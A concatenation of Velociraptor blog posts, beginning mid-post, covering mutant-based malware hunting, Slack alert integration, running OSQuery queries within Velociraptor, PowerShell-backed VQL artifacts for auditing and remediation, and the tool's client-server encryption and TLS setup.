![Mutant discovered by inspecting the Windows Object Namespace](../../img/1sU6LWAc-Qv4yC7knzPcXnw.png)*Mutant discovered by inspecting the Windows Object Namespace*

Clearly enumerating the handles of each process is much more useful — we can tell the process that actually holds the mutant handle (which in practice would be the rootkit process itself — or the host process in case of dll injection). Enumerating the kernel’s object namespace does not actually reveal a lot of context information but does positively identify the mutant’s presence. (The entire collection took around 6 seconds most of the time was spent enumerating all process handles).

In practice enumerating the handles of all running processes is much more expensive than simply enumerating the kernel’s namespace. Usually we just want to confirm or deny a specific Mutant name (which might appear in our threat intelligence stream) and for this it is sufficient to enumerate the kernel’s object namespace. Additionally, Velociraptor is unable to attach to some processes in order to enumerate their handles (e.g. system level processes) so it is not always able to get all handles. However, enumerating the kernel’s object namespace works better.

## **Turning detection into monitoring**

While hunting for mutants periodically across the network is not too difficult (simply schedule a hunt for the **Windows.Detection.Mutants** artifact) what would be really nice is to get a continuous live stream of mutants as they appear on the endpoint. This is a classic example of turning a Velociraptor artifact into a monitoring artifact.

I will start off by reusing the **Windows.Detection.Mutants** artifact. I will only use the method which enumerates the kernel namespace via the **winobj()** VQL plugin — first I search for it then click the edit button.

![](../../img/12CL6_OlHYcn6SBuuD1JwIQ.png)

I will change the type of the artifact to **CLIENT_EVENT** — this will allow Velociraptor to run it as a monitoring artifact on the endpoint.

What I actually want to collect are names of new mutant objects as they are created. I will enumerate the mutants periodically and then simply send the new mutants that appear since the last time as events to the server.

The [**diff()** ](https://www.velocidex.com/docs/vql_reference/event/)VQL plugin is perfect for this — the plugin simple runs a query periodically (e.g. every minute) then emits the rows which have been added or removed from last time.

![](../../img/11LTau_Ip_MRc6-ppQbXm9Q.png)

Now I will simply add the monitoring artifact to the client’s event monitoring table. This will get the endpoint to sync its monitoring artifacts and begin watching for new mutants.

![](../../img/1brhdj2MIDJyb6FV4TgT9uw.png)

A short time later, the events begin flowing to the server. I will run my PowerShell script to generate some bad mutant names and watch it in the GUI

![](../../img/1qu-OoE-SWwrQhMptI-rGmQ.png)

Once the event monitoring queries are synced with the client, the client will continue monitoring for new mutants — event when the endpoint is offline! The events will simply be queued on the endpoint until such time it can deliver them to the server.

**Conclusions**

In practice this is only a part of a larger solution. The mutants we collect from the endpoint are simply collected in the Velociraptor data store as large CSV files. It is possible to quickly search them (e.g. with a yara rule) and determine if any of the endpoints have a particular mutant name. For example if you have a threat feed with mutant names you may simply scan over all your historical files periodically.

Alternatively you can forward these events to a SIEM or Elasticsearch for easier integration with existing tooling (See[ Velociraptor to Elastic](https://medium.com/velociraptor-ir/velociraptor-to-elasticsearch-3a9fc02c6568?source=friends_link&sk=033f359180bf97b2b1f48a021ad3f0c5)). Velociraptor’s role is simply to collect the data — indexing and searching is left to you.

Hunting based on mutant name is an old technique and many new malware tools have adapted to produce semi-random mutant names, unique for each machine (e.g. they might hash the hostname to get a unique but stable mutant name). By collecting mutant names from all machines in your deployment you might be able to identify suspicious names even if they are unique.

Have you had much success hunting malware based on mutant names? Add your comments below to share your experiences…

---END OF FILE---

======
FILE: /content/blog/2020/2020-12-26-slack-and-velociraptor-b63803ba4b16/_index.md
======
---
title: Slack and Velociraptor
description: This post covers integration with Slack to provide an escalation mechanism. The Slack API is a typical REST API so the lessons in this post are directly applicable to many other systems...
tags:
- VQL
- Slack
- Integration
date: "2020-12-26"
---


![Photo by [Joan Gamell](https://unsplash.com/@gamell?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral)](https://cdn-images-1.medium.com/max/12030/0*bkglpXK2FLycHuia?width=600px)*Photo by [Joan Gamell](https://unsplash.com/@gamell?utm_source=medium&utm_medium=referral) on [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral)*

You might have heard of [Slack](https://slack.com/) — a chatting app that has grown in popularity over the past few years. Slack allows for API access to the the workspaces, which opens the door to novel applications and automation.

In this blog post I will demonstrate how to connect Slack to Velociraptor, and be notified within a Slack channel of various events that happen on your Velociraptor deployment.

### Creating a Slack App

The first thing I will do is create a Slack channel to receives messages from Velociraptor. This keeps Velociraptor messages separate and I can subscribe a small number of users within my Slack workspace to that channel.

I will create a new channel called “alerts”

Next I will create an App which will communicate with the workspace and be able to post messages to the alerts channel. (This [reference ](https://api.slack.com/start/overview#creating)has a lot of details on this step, which I will just skip but you should consult it for your own use). First I visit the slack API page at [https://api.slack.com/apps](../../img/apps)

![](../../img/14J5S4V0jlkVLvFKI3SaeUA.png)

Next I will create an app called “Velociraptor” that will be able to push messages to my workspace.

![](../../img/19RCHElLgfXOSdioPqfE28g.png)

Since I just want Velociraptor to inform me about events, it really only needs to push messages. I will therefore select the “Incoming Webhooks” app type.

![](../../img/1hzeftjwj-ItD5h_H_eE62g.png)

Enable the webhook by sliding the option to on

![](../../img/1EVMLGulrWcrmJfhHb9hRUA.png)

Webhooks are simply HTTP REST APIs which can be used by any software to post to the channel providing they have a special secret called a “Token”. I can add a new webhook to my workspace on this page

![](../../img/1WWBAXXo9zmQ4WFkeSvuhLQ.png)

I now allow the webhook to post to the alerts channel

![](../../img/1uAS5ZvGflIp_-zl2STlYpg.png)

Posting the message is a very simple HTTP request — Slack even shows an example using curl

![](../../img/1mubZvdsnaLV-fB_tfQpQNw.png)

The curl command line indicates that the request:

1. Needs to be using the POST method

1. Needs to have a content type of *application/json*

1. Needs to POST a JSON encoded object with a key called “text” which contains the message text.

### Posting a message from Velociraptor

Next I will test my new webhook by writing a quick VQL query in a Velociraptor notebook. I like to develop my VQL in a notebook, since that allows me to easily iterate over my query. Going to my Velociraptor console, I add a new notebook and add a VQL cell.

![](../../img/1GBkeEP6PTZnNttmw1B_Q1A.png)

Here I am just replicating the curl command line above using VQL’s http_client plugin. Once I save the cell, Velociraptor will make an API request to the slack servers and my message will appear in the alerts channel.

![](../../img/12QiKAIh7vZ0A9Xe9y3rtOg.png)

### Alerting on events

Sending messages to Slack is pretty cool, but we really want to know when interesting stuff happens in response to events. One interesting use case that people always ask me about is to alert when a particular machine comes back online so it can be interactively investigated.

From a usability perspective, I want to tell the server to monitor a number of endpoints, and then when each comes back online, send a Slack message and stop monitoring that system.

Whenever I have a set of machines that we want to operate on, I think of client labels. In Velociraptor, we can attach any number of labels to a client, and then search for all machines that have the label efficiently (this effectively creates a group of machines).

I will add the label “Slack” to my test machine by simply selecting it in the client search page and clicking the “Add Label” button.

![](../../img/1uKNwvvn723Ygr_STiMwsNg.png)

Going back to my notebook, I am ready to develop this VQL query step by step.

### Step 1: Is the client online now?

The first query I will write will return all the clients in the **“Slack”** label group, and show how many seconds ago they were online.

![](../../img/1wCX-kCRmOvkUZcgHYj3_ug.png)

I am using the now() VQL function to return the number of seconds since the epoch. The client’s **last_seen_at** time is given as microseconds since the epoch so I quickly convert it to seconds.

I can quickly retrieve the clients in the **“Slack”** label group by using the clients() plugin and applying a search expression “label:Slack”. Note that searching the clients by label in this way is much more efficient since it uses the label index rather than a row scan over all clients.

### Step 2: Alert for recently seen clients

The next step is to send a Slack message for all clients which have been seen recently (say in the last 5 minutes).

![](../../img/124ZL5EICiE_pZYKfTlPj7w.png)

I add a WHERE Condition to the previous query, then for each client, I re-use my earlier Slack query to post a message informing me which client is online.

![](../../img/1eKxlzgJgqGbbpIBDCYgTLQ.png)

### Step 3: Removing the client from the watchlist

Once I sent a slack alert for this client, I do not want to check it again. Let’s modify the above query to remove the label as well.

![](../../img/19a5wyFGxAik1oa1I8Qe4Uw.png)

### Step 4: Creating a monitoring artifact

We previously saw how I can check for clients and send slack messages in the notebook. While this is fun and helps to develop VQL, in order to actually run this, we need to have the server monitoring for new clients all the time — in other words we need a Monitoring (Or Events) Artifact.

The previous query just ran once and stopped, but I really want to run it continuously every minute say. I do this by running the previous query periodically using the **clock()** plugin.

I go to the “View Artifacts” sidebar and then click the “Add an artifact” button.

![](../../img/1ZKfuzpZHTGCd3b2mOEcGPg.png)

The two main differences here are that this is a SERVER_EVENT artifact — i.e. it is running on the server continuously. I then use the clock() plugin to trigger the previous query to run every minute and scan for new clients coming online (line 27: **foreach** **clock** event, run the **send_message** query).

### Step 5: Install the artifact

To install the artifact on the server, I will go to the Server Monitoring screen, and add it in the search view by clicking the “update server monitoring table” toolbar button.

![](../../img/1nsoI3t2io_Ww8gbCxptniw.png)

Now I can add the label to any client I am interested in and within a minute of it coming back online I will receive an alert in my slack channel

![](../../img/1_RuYRGYKlwA7VeMkExYcyA.png)

### Conclusions

In this post we saw how to make outbound REST API calls from the Velociraptor server using VQL. The example of Slack integration is a great use case for such an artifact, but there are many systems using HTTP style APIs (RESTfull or not) to be able to receive information from Velociraptor.

We saw how VQL can be written to run a continuous monitoring query on the server, checking for a condition that we are interested in. You could probably think of many examples of events that you will want to be notified of in a similar way (e.g. psexec used on any endpoint can be detected in near real time and escalated automatically to a Slack channel, or getting notified when a critical domain account is used anywhere on the network).

Escalating to Slack is suitable for fairly low frequency but high value events. If there are too many events, the channel will be too noisy and not useful (people will just mute it), so consider how frequently the alert will be fired, and how you intend to deal with it.

To play with this feature yourself, take[ Velociraptor for a spin](https://github.com/Velocidex/velociraptor)! It is a available on GitHub under an open source license. If you want to learn more about VQL and Velociraptor consider joining us on one of our [upcoming training sessions](https://www.velocidex.com/training/).

As always please file issues on the bug tracker or ask questions on our mailing list [velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com) . You can also chat with us directly on discord [https://www.velocidex.com/discord](https://www.velocidex.com/discord)

---END OF FILE---

======
FILE: /content/blog/2020/2020-12-13-velociraptor-and-osquery-2a4306dd23c/_index.md
======
---
title: Velociraptor and OSQuery
description: Digging deeper together…
tags:
- OSQuery
date: "2020-12-13"
---

![](../../img/19ovPD0uFOFPmMydH9lHTlA.png)

One of our favorite tools for endpoint visibility is [OSQuery](https://github.com/osquery/osquery). OSQuery has really transformed the state of endpoint visibility and DFIR by allowing analysts to flexibly issue queries to introspect endpoint state, just like a database. This flexibility has always been the inspiration for Velociraptor, and the development of the Velociraptor Query Language (VQL) followed the footsteps of OSQuery to provide a powerful and flexible query language.

However, while OSQuery provides a query engine with many plugins exposing machine state, it is not typically enough on its own. OSQuery itself does not provide a server, nor does it provide a GUI (there are a number of OSQuery servers, such as [FleetDM/Fleet](https://github.com/fleetdm/fleet)).

While, Velociraptor was designed to be a scalable DFIR tool that is easy to deploy (typically [deployed in minutes](https://www.youtube.com/watch?v=l1_sKDmNWS4&t=550s)). It is typically more complicated to deploy OSQuery at scale, use it to hunt widely and post-process the results.

Nevertheless, OSQuery has been around for a long time, and there are many existing queries that could be used immediately, without needing to convert then to VQL first.

{{% notice tip %}}

Velociraptor and OSQuery are not an either or choice — you can use
them both at the same time!

{{% /notice %}}

In recent releases Velociraptor directly integrates OSQuery on all supported platforms — so you can issue the same OSQuery query you always did and it would work exactly the same within Velociraptor. This blog post explains how the integration is done, and we go though a typical example to how Velociraptor can use OSQuery to hunt through many machines quickly.

### OSQuery integration

OSQuery itself is a query engine — it is distributed a single executable which is capable of evaluating a query, and returning a result set (essentially a table of rows and columns). In this sense OSQuery is very similar to VQL queries, which also return a result set.

The goal of the OSQuery integration is to make OSQuery appear as a natural extension to VQL. That is, within Velociraptor, OSQuery output is indistinguishable from the output of native VQL queries. This allows one to filter and enrich the OSQuery query using standard VQL.

Let’s have a look at the VQL artifact that implements OSQuery integration

<script src="https://gist.github.com/scudette/acb3daec29048a84a18a11977d710ecc.js" charset="utf-8"></script>

As described in a[ previous post](https://medium.com/velociraptor-ir/velociraptor-in-the-tool-age-d896dfe71b9), Velociraptor will deliver the OSQuery binary to the endpoint securely (line 29–30), then shell out to the binary executing the provided query (line 32–34). Finally the result is parsed from JSON and returned as a standard VQL result set (line 36–39).

The entire OSQuery integration is implemented as above in VQL — one does not need to do anything else in order to launch an OSQuery query on a remote host… In particular, one does not need to have OSQuery installed on the endpoint in advance! Velociraptor will push the binary to the endpoint on demand, managing binary versioning if required and maintaining a local copy of OSQuery on the endpoint.

### Let’s go hunting…

Let’s look for an interesting OSQuery query that we might want to run. A great resource of public OSQuery queries can be found in Recon Infosec’s public OSQuery resource [https://rhq.reconinfosec.com/](https://rhq.reconinfosec.com/tactics/lateral_movement/). For this example I will choose the query looking for[ SMB/Named Pipes](https://rhq.reconinfosec.com/tactics/lateral_movement/), written by Eric Capuano.

![](../../img/1xDWUDCakSzp1rOEoFAX0nQ.png)

A Named Pipe is a Windows IPC method that allows communication between different processes. Many attack tools open multiple processes, and use named pipes to communicate between those, [including metasploit or Cobalt Strike.](https://labs.f-secure.com/blog/detecting-cobalt-strike-default-modules-via-named-pipe-analysis/)

The query identifies processes using named pipes, making it a nice signal or a baseline for which processes in your environment typically communicate with pipes.

To test this query, I created a quick named pipe server in Powershell that creates a named pipe called **BlackJack**.

<script src="https://gist.github.com/scudette/a520632012eb8abdc223fd27de24fb2f.js" charset="utf-8"></script>

After selecting my test machine in the Velociraptor GUI, I created a new collection then searched for the OSQuery artifact. Since this is a Windows system, I select the Windows variant of the artifact.

![](../../img/1RVNYzIVcDFFheVsNVh6VNg.png)

After selecting the **Windows.OSQuery.Generic** artifact, I can click the “Configure Parameters” screen where I am able to enter the OSQuery query to run.

![](../../img/1EHhozA18vJkf_71fWEzixw.png)

Finally I click the “Launch” button to start the new collection. This will collect the **Windows.OSQuery.Generic** artifact on this machine, Velociraptor will push the OSQuery binary to the endpoints and cache it locally. On subsequent collections, the endpoint will compare the local hash of the binary with the required hash and only fetch a new version if necessary — therefore subsequent executions are very rapid.

![](../../img/1erZCLT_m1iht3lwyLXrjzQ.png)

As can be seen above, the OSQuery query produces a table of results, indistinguishable from a typical Velociraptor artifact.

### Extending OSQuery with VQL

The previous OSQuery query returns all the named pipes on the endpoint and their owner processes. Suppose we now wanted to build on this query and identify high value signals — for the sake of this example, suppose the named pipe “**BlackJack**” is a known malicious name belonging to a specific malware variant. Let us therefore, collect a process memory dump of all processes which open a named pipe with the name BlackJack for further analysis. We wish to do so by extending the OSQuery query we had earlier with some VQL.

I created a new custom Velociraptor artifact by wrapping some VQL around the existing OSQuery artifacts. To do this I click on the “View Artifacts” screen, select “Add an Artifact” and type the following YAML artifact into the GUI.

![](../../img/1KP41G6qnjZSKb1M4HqjRbg.png)

The full artifact text is also shown here.

<script src="https://gist.github.com/scudette/94ce124c4c04c9955b76a3b8130dd8fc.js" charset="utf-8"></script>

Velociraptor Artifacts are simply YAML files which encapsulate VQL queries and provide the whole thing with a name. Users now simply need to collect the **Custom.OSQuery.BlackJack** artifact without needing to write their own VQL.

Let’s take a look at how this artifact works. The VQL simply calls the same **Windows.OSQuery.Generic** artifact we ran previously, it then filters the result set to only match the **BlackJack** pipe. For each matching process, the VQL then call the **proc_dump()** plugin to obtain a dump of process memory and then uploads it to the server.

![](../../img/1S7hKtacdqBTHg_We6pG90A.png)

The result is a 230Mb dump file that can be opened by the windows debugger for each process found holding a named pipe called BlackJack.

We can now hunt our entire deployment looking for specific named pipes in seconds.

### Conclusions

In this blog post I demonstrated how Velociraptor integrates OSQuery as a natural extension to the Velociraptor Query Language. To use OSQuery with Velociraptor, one simply collects the relevant artifact from the endpoint. Users do not need to have OSQuery installed on the endpoint — Velociraptor manages the distribution and update of the binary as needed transparently behind the scenes.

We then saw how to extend OSQuery queries seamlessly with the additional functionality built into Velociraptor, by capturing and uploading memory dumps as additional triaging artifacts.

So what are the pros and cons of using OSQuery within Velociraptor?

The biggest advantage of the OSQuery integration is that existing OSQuery queries just work without modifications. This avoids having to rewrite the same queries in VQL using Velociraptor’s native query language (and potentially having to learn yet another query language). Having the ability to directly use OSQuery queries makes all the OSQuery resources on the web immediately available for use with Velociraptor (For example [Carbon Black’s Query Exchange](https://community.carbonblack.com/t5/Query-Exchange/idb-p/query_exchange)).

An obvious disadvantage of the integration is that Velociraptor still ends up shelling to OSQuery to actually perform the query — therefore Velociraptor has no control of the resource usage consumed by OSQuery during query execution (however cancelling the artifact collection will terminate the OSQuery process). While normal VQL queries have throttling setting controlling the CPU load, we lose this ability when running the OSQuery process.

To play with this feature yourself, take[ Velociraptor for a spin](https://github.com/Velocidex/velociraptor)! It is a available on GitHub under an open source license. As always please file issues on the bug tracker or ask questions on our mailing list [velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com) . You can also chat with us directly on discord [https://www.velocidex.com/discord](https://www.velocidex.com/discord)

---END OF FILE---

======
FILE: /content/blog/2020/2020-03-07-extending-vql-plugins-7fb004cb6ec4/_index.md
======
---
title: Extending VQL plugins
description: Adding endpoint functionality through Velociraptor Queries.
date: '2020-03-07T00:38:44.349Z'
categories: []
keywords: []
---

![](../../img/0iyK-hcG9nhlPHVOE.jpg?width=600px)

Velociraptor is a unique endpoint visibility tool because it provides the ability for users to write custom, tailored queries using the [Velociraptor Query Language](https://www.velocidex.com/docs/vql_reference/) (VQL). Having a powerful query language right at the endpoint gives our responders unprecedented flexibility, and the ability to leverage the experience of other analysts within the vibrant Velociraptor community.

VQL is a powerful language but was never designed to be a full featured programming language — it is deliberately kept simple and easy to use. VQL is essentially a glue language that allows more complete capabilities provided by VQL plugins to be strung together into a more functional query.

For example, raw MFT parsing is provided by the parse_mft() plugin which emits a row for each parsed mft entry. A VQL query can then filter out relevant MFT entries and potentially get a copy of the file, or attempt to recover deleted files (as described in our [previous article](../2019-11-15_recovering-deleted-ntfs-files-with-velociraptor-1fcf09855311/).

### VQL Basics

Although VQL is already very well documented elsewhere, for this article I will just outline the basic structure of a VQL query:

```vql
 SELECT x, y, z FROM plugin() WHERE x = 1
```

In the above, the query will run the VQL plugin which will produce a set of rows (A row is simply an object with columns and values). The query will then filter each row by the condition “x=1” and for matching rows, extract the columns x, y and x into the result set.

The simplicity of this language allows analysts to pick up Velociraptor in a short time and make powerful use of it. However, the actual data is generated by the plugin itself — how does one extend VQL to include new functionality?

### Extending VQL via Artifacts

One way to extend VQL is through defining [Artifacts](https://www.velocidex.com/docs/user-interface/artifacts/). Artifacts are a way to encapsulate other VQL queries in YAML files which can then be shared and added to Velociraptor at any time. Artifacts have a name by which they can be accessed in other queries. For example

```
 SELECT Name, SID FROM Artifact.Windows.Sys.Users()
```

The above query will simply run the artifact’s VQL query and emit each user on the system. We can now use it from our own query, filter it etc.

### Extending VQL via external code

While the above method is useful, it can only really wrap existing capabilities in Velociraptor — We are just wrapping an existing VQL query in an artifact reusing existing plugins, not extending the basic capabilities of Velociraptor.

Although VQL already comes with a lot of built in plugins, sometimes what we actually want is not built into Velociraptor itself. This might be because we never thought of the need (please file [a bug for feature requests](https://github.com/Velocidex/velociraptor)!) or because it simply would not make sense to include the functionality directly inside Velociraptor.

### Example — List Local Administrator Group Users

For example, suppose we wanted to list all the users that belong to the local administrator group on Windows. This information is obviously important because local administrators are extremely powerful accounts, and are sometimes granted to users who need administrator access to their local workstation. Often this access is not recorded or tracked properly. Even worse, sometimes local user accounts are created with local administrator group membership allowing those accounts to be logged into without AD oversight or controls. See [this](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models#on-workstations), and [this](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts) for more information.

While Velociraptor does not offer the functionality to query local groups, the functionality is readily available via PowerShell [Get-LocalGroupMember commandlet](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-localgroupmember?view=powershell-5.1).

```
Get-LocalGroupMember -Group “Administrators”
```

Let’s turn this Powershell commandlet into a Velociraptor artifact

<script src="https://gist.github.com/scudette/3b2ff76b8d032c800d38375e2cca0dd6.js"></script>

The powershell script simply runs the commandlet and extracts the SID and the username, converting the result to JSON. On the VQL size we encode the script and shell out to Powershell, then decode the output from JSON and produce VQL rows.

![](../../img/10seNp3si-PKiAj0pvhrzWg.png)

If we now collected this artifact as a hunt from our entire deployment we could have a listing of all local admin accounts within minutes from thousands of endpoints making it trivial to audit.

The whole VQL query and included powershell are now wrapped in an artifact, which can be called transparently from other VQL statements, further filtered etc. In fact using this methodology encapsulates the exact way the Artifact works, so that callers of this artifact do not really care (and cant really tell) that PowerShell is used instead of having a built in Velociraptor command.

We effectively just extended the capabilities of the endpoint tool without needing to rebuild or deploy a new version of Velociraptor! This allows for unprecedented flexibility in our DFIR work.

### Example — remediation

For the next example, suppose we discovered a widespread infection within our network. Typically, the malware installs various methods of re-infecting a host, and a common way is to install a malicious service ([See Att&ck Matrix 1035](https://attack.mitre.org/techniques/T1035/)). The Atomic Red Team has an example [simulation](https://github.com/redcanaryco/atomic-red-team/blob/8881bdb0029f186e7e06994e45ab1fb49e7adfa8/atomics/T1035/T1035.md):

![](../../img/1mDYbeZBXbsFzZuWLl_rPXA.png)

We can collect the **Windows.System.Services** artifact and identify the malicious service immediately

![](../../img/1St0TfmwTFJnRfLGsEuHCHw.png)

But now we would like to automatically clean it. We know the malicious service **PathName** value should match the keyword “marker.txt” (In reality we can come up with other unique keywords for the malicious service). So we just write the following artifact:

<script src="https://gist.github.com/scudette/2185ae021fc78f880a0caaaec3fb03a2.js"></script>

The powershell component actually stops, and removes the bad service, while the VQL component runs the **Windows.System.Services** artifacts, filters out the keyword to identify the malicious service and then calls powershell to remove it.

Now when collecting the artifact, we can see which machines had the malicious service installed, and how the removal went. We can then collect the **Windows.System.Services** artifact again to check that services were correctly removed.

![](../../img/1_gfWrRvoEQhZFQenbsz0MA.png)

Running a deployment wide hunt that collects this remediation artifact will automatically remove the bad service from all connected endpoints within a couple minutes. The hunt will then be applied on new endpoints as they come back online.

### Conclusions

Ultimately the VQL artifacts just delegate the heavy lifting to Powershell. This means that Velociraptor does not need to implement these feature internally since we can already rely on Powershell’s wide support for many products and system administration tasks. Formatting powershell output in machine readable format (like JSON) allows VQL to emit rows which are indistinguishable from those emitted by built in plugins — they can still be filtered and reused as usual in other VQL statements.

So what advantages does this present over just running remote powershell scripts? Why do we even need Velociraptor at all?

The main advantage is that Velociraptor has much wider reach — endpoints do not have to be accessible over WinRM, i.e. they can be at home or at a coffee shop, instead of having to stay on the corporate network. Since we never need to actually connect to the endpoint, we can reach it even when it is located behind NAT or filtered networks. Some road warrior type users are never present within the corporate LAN.

Additionally, when you run a Velociraptor hunt and the client is not immediately online, the hunt is scheduled until the endpoint comes back online. We can be sure to have wide coverage of our endpoints because we don’t need to chase them and try to remotely access them when they come online (some remote machine connect for minutes a day or at unusual timezones). We just set the hunt and forget it — the endpoint will remove the malicious service when it is ready automatically.

Finally, having the flexibility to encode powershell snippets inside artifacts allows us to develop reusable code. The users of our artifacts don’t really care how it works but can call it and tweak it using other VQL or simply by providing parameters in the GUI. This leads to excellent knowledge sharing and code reusability within the community.

Finally it must be said that remediation is inherently a risky activity. Most artifacts passively collect data from the endpoint, since Velociraptor is primarily an endpoint visibility tool. Deliberately making changes on the system carries with it an inherent level of risk and should be done very carefully. Like the Hippocratic Oath, we must “first, do no harm” ([`Primum non nocere`](https://en.wikipedia.org/wiki/Primum_non_nocere)). For example, if our regular expression selecting the malicious services is too loose we might end up removing many critical services from critical systems! Be sure to test your remediation artifacts first by disabling the actual removal script and seeing how many services we would attempt to remove.

---END OF FILE---

======
FILE: /content/blog/2020/2020-09-28-velociraptor-network-communications-30568624043a/_index.md
======
---
title: Velociraptor Communications
description: Listen to the beast
date: '2020-09-27T01:38:44.349Z'
tags:
- Internals
categories: []
keywords: []
---

![](../../img/0qkAnwMlxrKGQR6ke?width=600px)

You might have heard that Velociraptor allows you to quickly query endpoint state for rapid response and monitoring of many thousands of devices across the internet. Unlike some other tools, Velociraptor’s communication is scalable, secure and instantaneous.

Many people ask me about the client/server communication protocol. The [Velociraptor documentation](https://www.velocidex.com/docs/getting-started/stand_alone/) simply states that communications is encrypted over a TLS connection but there is more to it than that.

In this post I would like to delve into the low level details of how clients securely communicate with the server and cover some common deployment scenarios. By understanding exactly how this works we will gain insight into debugging communication problems and enabling more sophisticated deployment scenarios.

### Velociraptor’s config file

In the following discussion we will refer to a typical Velociraptor configuration file as generated by the command

```sh
velociraptor config generate -i
```
For this example we select a typical self-signed deployment.

<script src="https://gist.github.com/scudette/b0e80d3d039a74bfa2e41130f0c4955d.js" charset="utf-8"></script>

### Communication overview

Clients (Velociraptor instances running on endpoints) connect to the server over the http protocol, typically embedded within a TLS connection. Although Velociraptor shares the same communication protocol as was used in the GRR project, it was enhanced for Velociraptor’s use to be more secure and efficient.

### Velociraptor’s internal PKI

Every Velociraptor deployments creates an internal PKI which underpins it. The configuration wizard creates an internal CA with an X509 certificate and a private key. This CA is used to:

1. Create initial server certificates and any additional certificates for key rotation.

1. CA public certificate is embedded in the client’s configuration and is used to verify server communications.

1. The CA is used to create API keys for programmatic access. The server is then able to verify API clients.

The configuration file contains the CA’s X509 certificate in the **Client.ca_certificate** parameter (it is therefore embedded in the client configuration). The private key is contained in the **CA.private_key** parameter.


{{% notice tip %}}
In a secure installation you should remove the **CA.private_key** section from the server config and keep it offline. You only need it to create new API keys using the *velociraptor config api_client* command, and the server does not need it in normal operations.
{{% /notice %}}

### Messages

Clients and servers communicate by sending each other messages (which are simply protocol buffers), for example, a message may contain VQL queries or result sets. Messages are collected into a list and sent in a single POST operation in a **MessageList** protobuf. This protobuf is encrypted using a session key with a symmetric cipher (`aes_128_cbc`). The session key is chosen by the sending party and is written into an encrypted **Cipher** protobuf and sent along with each message.

![](../../img/1ntQkR2sRm8mIg5vkYjngEg.png)

This symmetric key is encoded in a **Cipher Properties** protobuf which is encrypted in turn using the receiving party’s public key and signed using the sending party’s private key.

### Key caching

The encrypted cipher is sent with each message and contains an encrypted version of the same session key. This means that it is always possible to derive the session key from each post message by performing RSA decrypt/verify operations, but having decoded the symmetric key once — it is possible to cache it for the remainder of the session. This avoids expensive RSA operations — as long as the server communicated with the client recently, the symmetric key will be cached and can be reused.

On a loaded server you might notice CPU utilization spikes for a few seconds after the system starts up, as the server unlocks the session keys from incoming clients, but after that the server should not need to perform many RSA operations and CPU load should be low since most session keys are cached in memory.

The **Frontend.expected_clients** setting controls the size of the memory cache of session keys. If this is too small, keys will be evicted from cache and CPU load will rapidly rise as the server is forced to do more RSA operations to decrypt client messages. You should increase this value to reflect how many clients you expect to be active at the same time.

## HTTP protocol

In the last section we saw that Velociraptor messages are both signed and encrypted by the internal deployment CA. But how are these messages exchanged over the internet?

Velociraptor uses HTTPS POST messages to deliver message sets to the server. The server in turn sends messages to the client in the body of the POST request. The client connects to one of the server URLs provided in the **Client.server_urls** setting in its config file.

Before the client communicates with the server, the client must verify it is actually talking with the correct server. This happens at two levels:

* If the URL is a HTTPS URL then the TLS connection needs to be verified

* The client will fetch the url /server.pem to receive the server’s internal certificate. This certificate must be verified by the embedded CA.

Note that this verification is essential in order to prevent the client from accidentally talking with captive portals or MITM proxies.

### TLS verification

Velociraptor currently supports 2 modes for deployment via the config wizard:

* Self-signed mode uses internal CAs for the TLS certificates. The client knows it is in self-signed mode if the **Client.use_self_signed_ssl** flag is true.

* Proper certificates minted by Let’s encrypt.

Velociraptor verifies self-signed TLS certificates using its built in CA. This essentially pins the server’s certificate inside the client — even if a MITM was able to mint another certificate (even if it was trusted by the global roots!) it would not be valid since it was not issued by Velociraptor’s internal CA which is the only CA we trust in this mode! In this way self-signed mode is more secure than use a public CA.

The **Client.pinned_server_name** specifies the common name of the server (or DNS name in the Server Alternate Name (SAN) field). The client verifies that the certificate is correct **AND** that the name is the same as the pinned name. You typically do not need to change this setting.

If the client is not in self-signed mode (i.e. **Client.use_self_signed_ssl** is false or not present), it expects to verify TLS connections using the system’s root certificate store. In this configuration, Velociraptor is susceptible to a MITM SSL inspection proxy, and we must rely on the internal encryption mechanism as described in the previous section to protect communications.

**NOTE**: In practice we find that often customer networks do contain SSL inspection proxies and using self-signed certificates breaks communications altogether. We typically prefer to deploy Let’s Encrypt certificates for reliability and better interoperability.

### Debugging client communications

Now that we have an understanding on the low level communication mechanism, let’s try to apply our understanding to debugging common deployment issues.

If the client does not appear to properly connect to the server, the first thing is to run it manually (using the *velociraptor client -v* command):

![](../../img/1TOeyrCcX69mtUdO8E4ZK9g.png)

In the above example, I ran the client manually with the -v switch. I see the client starting up and immediately trying to connect to its URL (in this case [https://test.velocidex-training.com/](https://test.velocidex-training.com/) ) However this fails and the client will wait for a short time before retrying to connect again.

![](../../img/1IzCgKdN28sjntuxd9mUJew.png)

A common problem here is network filtering making it impossible to reach the server. You can test this by simply running curl with the server’s URL.

Once you enable connectivity, you might encounter another problem

![](../../img/1p3MPNfTbXBzNMs-X4yv4SA.png)

The **Unable to parse PEM** message indicates that the client is trying to fetch the **server.pem** file but it is not able to validate it. This often happens with captive portal type of proxies which interfere with the data transferred. It can also happen if your DNS setting point to a completely different server.

We can verify the **server.pem** manually by using curl (note that when using self-signed mode you might need to provide curl with the -k flag to ignore the certificate errors):

![](../../img/1P9W4CnX9qNLGiRgnHGyLAw.png)

Note that the **server.pem** is always signed by the velociraptor internal CA in all deployment modes (even with lets encrypt). You can view the certificate details by using openssl:

```sh
curl https://test.velocidex-training.com/server.pem | openssl x509 -text
```


## SSL Offloading

The Velociraptor server is very fast and can typically handle many thousands of clients connected at the same time. One of the largest limitations though is SSL processing. Typically SSL operations can take a significant amount of CPU resources in performing cryptography (we noted previously that Velociraptor’s own cryptography can be cached and therefore usually does not use much CPU).

Once approach to help scalability is to offload SSL processing to special reverse proxies. Typically these can use hardware cryptography acceleration to offload crypto from the CPU.

![](../../img/1ppLjm2qy0pRt3RsDVKDDWA.png)

In this example, we will show how nginx can be used to terminate the TLS connections and then forward plain HTTP connections to the Velociraptor server (Many cloud provides also offer a cloud version of an SSL load balancer). This setup is also suitable if you want to use standard certificates (i.e. not Let’s Encrypt ones).

